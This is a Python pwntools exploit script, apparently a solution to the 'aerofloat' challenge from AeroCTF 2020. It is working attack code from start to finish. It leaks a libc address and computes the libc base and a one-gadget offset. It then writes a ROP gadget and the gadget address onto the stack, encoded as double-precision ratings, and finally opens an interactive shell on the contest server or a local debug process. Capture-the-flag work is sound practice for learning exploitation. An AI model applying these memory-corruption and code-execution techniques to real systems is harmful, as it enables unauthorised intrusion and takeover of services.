#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/aero2020/aerofloat/'
config = {
        'elf' : chdir + 'aerofloat',
        'libc' : chdir + 'libc.so.6',
        'HOST' : 'tasks.aeroctf.com',
        'PORT' : 33017
}

count = 1
def set_rating(r, ticket_id, rating):
    global count
    r.sendlineafter('>', '1')
    r.sendafter(':', str(ticket_id))
    r.sendlineafter(':', str(rating))
    log.info("\n Current Sended: {}".format(count))
    count += 1

def double_to_hex(f):
    return hex(struct.unpack('<Q', struct.pack('<d', f))[0])

def hex_to_double(h):
    return struct.unpack('d', h)[0]

def exploit(r):
    r.sendlineafter(':', 'a')
    for i in range(6):
        set_rating(r, 'a'*8, '.')
        r.recvuntil('4. Exit')
    set_rating(r, 'a'*8, '.')
    r.recvuntil('a'*8)
    leak_addr = u64(r.recvn(6).ljust(8,'\x00'))
    libc_base = leak_addr - 0xa4745
    one_shot = libc_base + 0xc84e0
    log.info('leak addr : {:#x}'.format(leak_addr))
    log.info('libc base : {:#x}'.format(libc_base))
    log.info('one shot : {:#x}'.format(one_shot))
    
    for i in range(5):
        set_rating(r, 'a', '.')
        r.recvuntil('4. Exit')

    pop_rdx_ret = libc_base + 0x107545
    set_rating(r, p64(0x401560), '%.1000f' % float(hex_to_double(p64(pop_rdx_ret))))
    r.recvuntil('4. Exit')
    set_rating(r, p64(0), '%.1000f' % float(hex_to_double(p64(one_shot))))
    r.recvuntil('4. Exit')
    r.sendlineafter('>', '4')
    pause()
    r.interactive()

if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    context.log_level = 'debug'

    if len(sys.argv) > 1:
        r = remote(config["HOST"], config["PORT"])
    else:
	context.terminal=['tmux', 'splitw', '-h']
	cmd = ['./ld-linux-x86-64.so.2', '--library-path', chdir, e.path]
	r = process(cmd)
	gdb.attach(r, gdbscript='''
		b *0x401192
	''')
    exploit(r)

